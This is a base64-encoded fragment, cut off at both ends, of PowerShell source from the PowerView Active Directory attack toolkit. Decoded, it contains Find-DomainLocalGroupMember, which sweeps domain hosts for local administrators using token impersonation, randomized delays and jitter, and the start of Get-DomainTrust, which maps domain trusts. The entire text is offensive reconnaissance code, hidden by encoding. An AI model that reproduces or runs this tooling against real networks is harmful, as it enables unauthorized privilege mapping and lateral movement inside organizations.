wTWVtYmVyIC1Eb21haW4gdGVzdGxhYi5sb2NhbCAtQ3JlZGVudGlhbCAkQ3JlZAoKRW51bWVyYXRlcyB0aGUgbG9jYWwgZ3JvdXAgbWVtYmVyc2hpcHMgZm9yIGFsbCByZWFjaGFibGUgbWFjaGluZXMgdGhlIGRldi50ZXN0bGFiLmxvY2FsCmRvbWFpbiB1c2luZyB0aGUgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzLgoKLk9VVFBVVFMKClBvd2VyVmlldy5Mb2NhbEdyb3VwTWVtYmVyLkFQSQoKQ3VzdG9tIFBTT2JqZWN0IHdpdGggdHJhbnNsYXRlZCBncm91cCBwcm9wZXJ0eSBmaWVsZHMgZnJvbSBBUEkgcmVzdWx0cy4KClBvd2VyVmlldy5Mb2NhbEdyb3VwTWVtYmVyLldpbk5UCgpDdXN0b20gUFNPYmplY3Qgd2l0aCB0cmFuc2xhdGVkIGdyb3VwIHByb3BlcnR5IGZpZWxkcyBmcm9tIFdpbk5UIHJlc3VsdHMuCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuTG9jYWxHcm91cE1lbWJlci5BUEknKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuTG9jYWxHcm91cE1lbWJlci5XaW5OVCcpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdETlNIb3N0TmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQ29tcHV0ZXJOYW1lLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyRG9tYWluLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyTERBUEZpbHRlciwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlclNlYXJjaEJhc2UsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdPcGVyYXRpbmdTeXN0ZW0nKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlck9wZXJhdGluZ1N5c3RlbSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ1NlcnZpY2VQYWNrJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJTZXJ2aWNlUGFjaywKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ1NpdGVOYW1lJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJTaXRlTmFtZSwKCiAgICAgICAgW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkR3JvdXBOYW1lID0gJ0FkbWluaXN0cmF0b3JzJywKCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdBUEknLCAnV2luTlQnKV0KICAgICAgICBbQWxpYXMoJ0NvbGxlY3Rpb25NZXRob2QnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRNZXRob2QgPSAnQVBJJywKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHksCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICREZWxheSA9IDAsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDAuMCwgMS4wKV0KICAgICAgICBbRG91YmxlXQogICAgICAgICRKaXR0ZXIgPSAuMywKCiAgICAgICAgW0ludF0KICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDApXQogICAgICAgICRUaHJlYWRzID0gMjAKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICAgICAnUHJvcGVydGllcycgPSAnZG5zaG9zdG5hbWUnCiAgICAgICAgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyRG9tYWluJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJENvbXB1dGVyRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlckxEQVBGaWx0ZXInXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snTERBUEZpbHRlciddID0gJENvbXB1dGVyTERBUEZpbHRlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJTZWFyY2hCYXNlJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRDb21wdXRlclNlYXJjaEJhc2UgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1VuY29uc3RyYWluZWQnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snVW5jb25zdHJhaW5lZCddID0gJFVuY29uc3RyYWluZWQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyT3BlcmF0aW5nU3lzdGVtJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ09wZXJhdGluZ1N5c3RlbSddID0gJE9wZXJhdGluZ1N5c3RlbSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJTZXJ2aWNlUGFjayddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydTZXJ2aWNlUGFjayddID0gJFNlcnZpY2VQYWNrIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlclNpdGVOYW1lJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NpdGVOYW1lJ10gPSAkU2l0ZU5hbWUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQoKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlck5hbWUnXSkgewogICAgICAgICAgICAkVGFyZ2V0Q29tcHV0ZXJzID0gJENvbXB1dGVyTmFtZQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnW0ZpbmQtRG9tYWluTG9jYWxHcm91cE1lbWJlcl0gUXVlcnlpbmcgY29tcHV0ZXJzIGluIHRoZSBkb21haW4nCiAgICAgICAgICAgICRUYXJnZXRDb21wdXRlcnMgPSBHZXQtRG9tYWluQ29tcHV0ZXIgQENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHMgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBkbnNob3N0bmFtZQogICAgICAgIH0KICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Eb21haW5Mb2NhbEdyb3VwTWVtYmVyXSBUYXJnZXRDb21wdXRlcnMgbGVuZ3RoOiAkKCRUYXJnZXRDb21wdXRlcnMuTGVuZ3RoKSIKICAgICAgICBpZiAoJFRhcmdldENvbXB1dGVycy5MZW5ndGggLWVxIDApIHsKICAgICAgICAgICAgdGhyb3cgJ1tGaW5kLURvbWFpbkxvY2FsR3JvdXBNZW1iZXJdIE5vIGhvc3RzIGZvdW5kIHRvIGVudW1lcmF0ZScKICAgICAgICB9CgogICAgICAgICMgdGhlIGhvc3QgZW51bWVyYXRpb24gYmxvY2sgd2UncmUgdXNpbmcgdG8gZW51bWVyYXRlIGFsbCBzZXJ2ZXJzCiAgICAgICAgJEhvc3RFbnVtQmxvY2sgPSB7CiAgICAgICAgICAgIFBhcmFtKCRDb21wdXRlck5hbWUsICRHcm91cE5hbWUsICRNZXRob2QsICRUb2tlbkhhbmRsZSkKCiAgICAgICAgICAgICMgQWRkIGNoZWNrIGlmIHVzZXIgZGVmYXVsdHMgdG8vc2VsZWN0cyAiQWRtaW5pc3RyYXRvcnMiCiAgICAgICAgICAgIGlmICgkR3JvdXBOYW1lIC1lcSAiQWRtaW5pc3RyYXRvcnMiKSB7CiAgICAgICAgICAgICAgICAkQWRtaW5TZWN1cml0eUlkZW50aWZpZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuU2VjdXJpdHlJZGVudGlmaWVyKFtTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldlbGxLbm93blNpZFR5cGVdOjpCdWlsdGluQWRtaW5pc3RyYXRvcnNTaWQsJG51bGwpCiAgICAgICAgICAgICAgICAkR3JvdXBOYW1lID0gKCRBZG1pblNlY3VyaXR5SWRlbnRpZmllci5UcmFuc2xhdGUoW1N5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuTlRBY2NvdW50XSkuVmFsdWUgLXNwbGl0ICJcXCIpWy0xXQogICAgICAgICAgICB9CgogICAgICAgICAgICBpZiAoJFRva2VuSGFuZGxlKSB7CiAgICAgICAgICAgICAgICAjIGltcGVyc29uYXRlIHRoZSB0aGUgdG9rZW4gcHJvZHVjZWQgYnkgTG9nb25Vc2VyKCkvSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uCiAgICAgICAgICAgICAgICAkTnVsbCA9IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiAtVG9rZW5IYW5kbGUgJFRva2VuSGFuZGxlIC1RdWlldAogICAgICAgICAgICB9CgogICAgICAgICAgICBGb3JFYWNoICgkVGFyZ2V0Q29tcHV0ZXIgaW4gJENvbXB1dGVyTmFtZSkgewogICAgICAgICAgICAgICAgJFVwID0gVGVzdC1Db25uZWN0aW9uIC1Db3VudCAxIC1RdWlldCAtQ29tcHV0ZXJOYW1lICRUYXJnZXRDb21wdXRlcgogICAgICAgICAgICAgICAgaWYgKCRVcCkgewogICAgICAgICAgICAgICAgICAgICROZXRMb2NhbEdyb3VwTWVtYmVyQXJndW1lbnRzID0gQHsKICAgICAgICAgICAgICAgICAgICAgICAgJ0NvbXB1dGVyTmFtZScgPSAkVGFyZ2V0Q29tcHV0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgJ01ldGhvZCcgPSAkTWV0aG9kCiAgICAgICAgICAgICAgICAgICAgICAgICdHcm91cE5hbWUnID0gJEdyb3VwTmFtZQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBHZXQtTmV0TG9jYWxHcm91cE1lbWJlciBATmV0TG9jYWxHcm91cE1lbWJlckFyZ3VtZW50cwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICBpZiAoJFRva2VuSGFuZGxlKSB7CiAgICAgICAgICAgICAgICBJbnZva2UtUmV2ZXJ0VG9TZWxmCiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgICRMb2dvblRva2VuID0gJE51bGwKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRGVsYXknXSAtb3IgJFBTQm91bmRQYXJhbWV0ZXJzWydTdG9wT25TdWNjZXNzJ10pIHsKICAgICAgICAgICAgICAgICRMb2dvblRva2VuID0gSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIC1DcmVkZW50aWFsICRDcmVkZW50aWFsCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkTG9nb25Ub2tlbiA9IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbCAtUXVpZXQKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICAjIG9ubHkgaWdub3JlIHRocmVhZGluZyBpZiAtRGVsYXkgaXMgcGFzc2VkCiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRGVsYXknXSAtb3IgJFBTQm91bmRQYXJhbWV0ZXJzWydTdG9wT25TdWNjZXNzJ10pIHsKCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpbkxvY2FsR3JvdXBNZW1iZXJdIFRvdGFsIG51bWJlciBvZiBob3N0czogJCgkVGFyZ2V0Q29tcHV0ZXJzLmNvdW50KSIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluTG9jYWxHcm91cE1lbWJlcl0gRGVsYXk6ICREZWxheSwgSml0dGVyOiAkSml0dGVyIgogICAgICAgICAgICAkQ291bnRlciA9IDAKICAgICAgICAgICAgJFJhbmRObyA9IE5ldy1PYmplY3QgU3lzdGVtLlJhbmRvbQoKICAgICAgICAgICAgRm9yRWFjaCAoJFRhcmdldENvbXB1dGVyIGluICRUYXJnZXRDb21wdXRlcnMpIHsKICAgICAgICAgICAgICAgICRDb3VudGVyID0gJENvdW50ZXIgKyAxCgogICAgICAgICAgICAgICAgIyBzbGVlcCBmb3Igb3VyIHNlbWktcmFuZG9taXplZCBpbnRlcnZhbAogICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgJFJhbmROby5OZXh0KCgxLSRKaXR0ZXIpKiREZWxheSwgKDErJEppdHRlcikqJERlbGF5KQoKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpbkxvY2FsR3JvdXBNZW1iZXJdIEVudW1lcmF0aW5nIHNlcnZlciAkVGFyZ2V0Q29tcHV0ZXIgKCRDb3VudGVyIG9mICQoJFRhcmdldENvbXB1dGVycy5jb3VudCkpIgogICAgICAgICAgICAgICAgSW52b2tlLUNvbW1hbmQgLVNjcmlwdEJsb2NrICRIb3N0RW51bUJsb2NrIC1Bcmd1bWVudExpc3QgJFRhcmdldENvbXB1dGVyLCAkR3JvdXBOYW1lLCAkTWV0aG9kLCAkTG9nb25Ub2tlbgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Eb21haW5Mb2NhbEdyb3VwTWVtYmVyXSBVc2luZyB0aHJlYWRpbmcgd2l0aCB0aHJlYWRzOiAkVGhyZWFkcyIKCiAgICAgICAgICAgICMgaWYgd2UncmUgdXNpbmcgdGhyZWFkaW5nLCBraWNrIG9mZiB0aGUgc2NyaXB0IGJsb2NrIHdpdGggTmV3LVRocmVhZGVkRnVuY3Rpb24KICAgICAgICAgICAgJFNjcmlwdFBhcmFtcyA9IEB7CiAgICAgICAgICAgICAgICAnR3JvdXBOYW1lJyA9ICRHcm91cE5hbWUKICAgICAgICAgICAgICAgICdNZXRob2QnID0gJE1ldGhvZAogICAgICAgICAgICAgICAgJ1Rva2VuSGFuZGxlJyA9ICRMb2dvblRva2VuCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICMgaWYgd2UncmUgdXNpbmcgdGhyZWFkaW5nLCBraWNrIG9mZiB0aGUgc2NyaXB0IGJsb2NrIHdpdGggTmV3LVRocmVhZGVkRnVuY3Rpb24gdXNpbmcgdGhlICRIb3N0RW51bUJsb2NrICsgcGFyYW1zCiAgICAgICAgICAgIE5ldy1UaHJlYWRlZEZ1bmN0aW9uIC1Db21wdXRlck5hbWUgJFRhcmdldENvbXB1dGVycyAtU2NyaXB0QmxvY2sgJEhvc3RFbnVtQmxvY2sgLVNjcmlwdFBhcmFtZXRlcnMgJFNjcmlwdFBhcmFtcyAtVGhyZWFkcyAkVGhyZWFkcwogICAgICAgIH0KICAgIH0KCiAgICBFTkQgewogICAgICAgIGlmICgkTG9nb25Ub2tlbikgewogICAgICAgICAgICBJbnZva2UtUmV2ZXJ0VG9TZWxmIC1Ub2tlbkhhbmRsZSAkTG9nb25Ub2tlbgogICAgICAgIH0KICAgIH0KfQoKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMKIyBEb21haW4gdHJ1c3QgZnVuY3Rpb25zIGJlbG93LgojCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgpmdW5jdGlvbiBHZXQtRG9tYWluVHJ1c3Qgewo8IwouU1lOT1BTSVMKClJldHVybiBhbGwgZG9tYWluIHRydXN0cyBmb3IgdGhlIGN1cnJlbnQgZG9tYWluIG9yIGEgc3BlY2lmaWVkIGRvbWFpbi4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogR2V0LURvbWFpbiwgR2V0LURvbWFpblNlYXJjaGVyLCBHZXQtRG9tYWluU0lELCBQU1JlZmxlY3QgIAoKLkRFU0NSSVBUSU9OCgpUaGlzIGZ1bmN0aW9uIHdpbGwgZW51bWVyYXRlIGRvbWFpbiB0cnVzdCByZWxhdGlvbnNoaXBzIGZvciB0aGUgY3VycmVudCAob3IgYSByZW1vdGUpCmRvbWFpbiB1c2luZyBhIG51bWJlciBvZiBtZXRob2RzLiBCeSBkZWZhdWx0LCBhbmQgTERBUCBzZWFyY2ggdXNpbmcgdGhlIGZpbHRlcgonKG9iamVjdENsYXNzPXRydXN0ZWREb21haW4pJyBpcyB1c2VkLSBpZiBhbnkgTERBUC1hcHByb3ByaWF0ZSBwYXJhbWV0ZXJzIGFyZSBzcGVjaWZpZWQKTERBUCBpcyB1c2VkIGFzIHdlbGwuIElmIHRoZSAtTkVUIGZsYWcgaXMgc3BlY2lmaWVkLCB0aGUgLk5FVCBtZXRob2QKR2V0QWxsVHJ1c3RSZWxhdGlvbnNoaXBzKCkgaXMgdXNlZCBvbiB0aGUgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5Eb21haW4Kb2JqZWN0LiBJZiB0aGUgLUFQSSBmbGFnIGlzIHNwZWNpZmllZCwgdGhlIFdpbjMyIEFQSSBEc0VudW1lcmF0ZURvbWFpblRydXN0cygpIGNhbGwgaXMKdXNlZCB0byBlbnVtZXJhdGUgaW5zdGVhZC4KCi5QQVJBTUVURVIgRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiB0byBxdWVyeSBmb3IgdHJ1c3RzLCBkZWZhdWx0cyB0byB0aGUgY3VycmVudCBkb21haW4uCgouUEFSQU1FVEVSIEFQSQoKU3dpdGNoLiBVc2UgYW4gQVBJIGNhbGwgKERzRW51bWVyYXRlRG9tYWluVHJ1c3RzKSB0byBlbnVtZXJhdGUgdGhlIHRydXN0cyBpbnN0ZWFkIG9mIHRoZSBidWlsdC1pbgouTkVUIG1ldGhvZHMuCgouUEFSQU1FVEVSIE5FVAoKU3dpdGNoLiBVc2UgLk5FVCBxdWVyaWVzIHRvIGVudW1lcmF0ZSB0cnVzdHMgaW5zdGVhZCBvZiB0aGUgZGVmYXVsdCBMREFQIG1ldGhvZC4KCi5QQVJBTUVURVIgTERBUEZpbHRlcgoKU3BlY2lmaWVzIGFuIExEQVAgcXVlcnkgc3RyaW5nIHRoYXQgaXMgdXNlZCB0byBmaWx0ZXIgQWN0aXZlIERpcmVjdG9yeSBvYmplY3RzLgoKLlBBUkFNRVRFUiBQcm9wZXJ0aWVzCgpTcGVjaWZpZXMgdGhlIHByb3BlcnRpZXMgb2YgdGhlIG91dHB1dCBvYmplY3QgdG8gcmV0cmlldmUgZnJvbSB0aGUgc2VydmVyLgoKLlBBUkFNRVRFUiBTZWFyY2hCYXNlCgpUaGUgTERBUCBzb3VyY2UgdG8gc2VhcmNoIHRocm91Z2gsIGUuZy4gIkxEQVA6Ly9PVT1zZWNyZXQsREM9dGVzdGxhYixEQz1sb2NhbCIKVXNlZnVsIGZvciBPVSBxdWVyaWVzLgoKLlBBUkFNRVRFUiBTZXJ2ZXIKClNwZWNpZmllcyBhbiBBY3RpdmUgRGlyZWN0b3J5IHNlcnZlciAoZG9tYWluIGNvbnRyb2xsZXIpIHRvIGJpbmQgdG8uCgouUEFSQU1FVEVSIFNlYXJjaFNjb3BlCgpTcGVjaWZpZXMgdGhlIHNjb3BlIHRvIHNlYXJjaCB1bmRlciwgQmFzZS9PbmVMZXZlbC9TdWJ0cmVlIChkZWZhdWx0IG9mIFN1YnRyZWUpLgoKLlBBUkFNRVRFUiBSZXN1bHRQYWdlU2l6ZQoKU3BlY2lmaWVzIHRoZSBQYWdlU2l6ZSB0byBzZXQgZm9yIHRoZSBMREFQIHNlYXJjaGVyIG9iamVjdC4KCi5QQVJBTUVURVIgU2VydmVyVGltZUxpbWl0CgpTcGVjaWZpZXMgdGhlIG1heGltdW0gYW1vdW50IG9mIHRpbWUgdGhlIHNlcnZlciBzcGVuZHMgc2VhcmNoaW5nLiBEZWZhdWx0IG9mIDEyMCBzZWNvbmRzLgoKLlBBUkFNRVRFUiBUb21ic3RvbmUKClN3aXRjaC4gU3BlY2lmaWVzIHRoYXQgdGhlIHNlYXJjaGVyIHNob3VsZCBhbHNvIHJldHVybiBkZWxldGVkL3RvbWJzdG9uZWQgb2JqZWN0cy4KCi5QQVJBTUVURVIgRmluZE9uZQoKT25seSByZXR1cm4gb25lIHJlc3VsdCBvYmplY3QuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4uCgouRVhBTVBMRQoKR2V0LURvbWFpblRydXN0CgpSZXR1cm4gZG9tYWluIHRydXN0cyBmb3IgdGhlIGN1cnJlbnQgZG9tYWluIHVzaW5nIGJ1aWx0IGluIC5MREFQIG1ldGhvZHMuCgouRVhBTVBMRQoKR2V0LURvbWFpblRydXN0IC1ORVQgLURvbWFpbiAicHJvZC50ZXN0bGFiLmxvY2FsIgoKUmV0dXJuIGRvbWFpbiB0cnVzdHMgZm9yIHRoZSAicHJvZC50ZXN0bGFiLmxvY2FsIiBkb21haW4gdXNpbmcgLk5FVCBtZXRob2RzCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKR2V0LURvbWFpblRydXN0IC1Eb21haW4gInByb2QudGVzdGxhYi5sb2NhbCIgLVNlcnZlciAiUFJJTUFSWS50ZXN0bGFiLmxvY2FsIiAtQ3JlZGVudGlhbCAkQ3JlZAoKUmV0dXJuIGRvbWFpbiB0cnVzdHMgZm9yIHRoZSAicHJvZC50ZXN0bGFiLmxvY2FsIiBkb21haW4gZW51bWVyYXRlZCB0aHJvdWdoIExEQVAKcXVlcmllcywgYmluZGluZyB0byB0aGUgUFJJTUFSWS50ZXN0bGFiLmxvY2FsIHNlcnZlciBmb3IgcXVlcmllcywgYW5kIHVzaW5nIHRoZSBzcGVjaWZpZWQKYWx0ZXJuYXRlIGNyZWRlbml0YWxzLgoKLkVYQU1QTEUKCkdldC1Eb21haW5UcnVzdCAtQVBJIC1Eb21haW4gInByb2QudGVzdGxhYi5sb2NhbCIKClJldHVybiBkb21haW4gdHJ1c3RzIGZvciB0aGUgInByb2QudGVzdGxhYi5sb2NhbCIgZG9tYWluIGVudW1lcmF0ZWQgdGhyb3VnaCBBUEkgY2FsbHMuCgouT1VUUFVUUwoKUG93ZXJWaWV3LkRvbWFpblRydXN0LkxEQVAKCkN1c3RvbSBQU09iamVjdCB3aXRoIHRyYW5zbGF0ZWQgZG9tYWluIExEQVAgdHJ1c3QgcmVzdWx0IGZpZWxkcyAoZGVmYXVsdCkuCgpQb3dlclZpZXcuRG9tYWluVHJ1c3QuTkVUCgpBIFRydXN0UmVsYXRpb25zaGlwSW5mb3JtYXRpb25Db2xsZWN0aW9uIHJldHVybmVkIHdoZW4gdXNpbmcgLk5FVCBtZXRob2RzLgoKUG93ZXJWaWV3LkRvbWFpblRydXN0LkFQSQoKQ3VzdG9tIFBTT2JqZWN0IHdpdGggdHJhbnNsYXRlZCBkb21haW4gQVBJIHRydXN0IHJlc3VsdCBmaWVsZHMuCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuRG9tYWluVHJ1c3QuTkVUJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LkRvbWFpblRydXN0LkxEQVAnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuRG9tYWluVHJ1c3QuQVBJJyldCiAgICBbQ21kbGV0QmluZGluZyhEZWZhdWx0UGFyYW1ldGVyU2V0TmFtZSA9ICdMREFQJyldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ05hbWUnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbW